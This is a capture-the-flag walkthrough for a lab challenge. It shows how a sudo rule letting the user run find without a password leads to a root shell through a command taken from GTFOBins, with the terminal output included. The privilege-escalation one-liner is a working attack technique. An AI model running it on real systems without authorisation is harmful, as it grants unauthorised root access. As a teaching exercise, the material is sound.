# Solution of ctf_3
## Goal
Discovering a tool for privilege escalation.

## Step by step
As always, let's see the tip.
>
    user3@cec9d28f92fc:~$ ls
    user.txt
    user3@cec9d28f92fc:~$ cat user.txt 
    You will need to find deeper than that !


It is not quite clear for now how we should proceed... Let's try the same thing as the previous ctf.

>
    user3@cec9d28f92fc:~$ sudo -l
    Matching Defaults entries for user3 on cec9d28f92fc:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
        use_pty

    User user3 may run the following commands on cec9d28f92fc:
        (ALL) NOPASSWD: /bin/find

It seems now that we have access to another command : `/bin/find`. And we can use it as root with no password. But how to gain root access with it ?

At this point, you can make research on your side on how to use `/bin/find` and find the answer.

Here, I will give you a website to also help you with future CTFs : `https://gtfobins.github.io/`.

This website is really useful for this kind of situation. When you are able to execute commands (binaries) with sudo, this website is the way to go to learn if something fancy is possible.

If you search `find`, you see that this command can be used particularly with `Sudo`.
> 
    Sudo
    If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

        sudo find . -exec /bin/sh \; -quit

It seems that there is a way to keep root privilege by running this command. Let's try it out.

> 
    user3@cec9d28f92fc:~$ sudo find . -exec /bin/sh \; -quit
    # whoami
    root

Bingo ! We are now root ! You can now `cd /root` and find the flag.

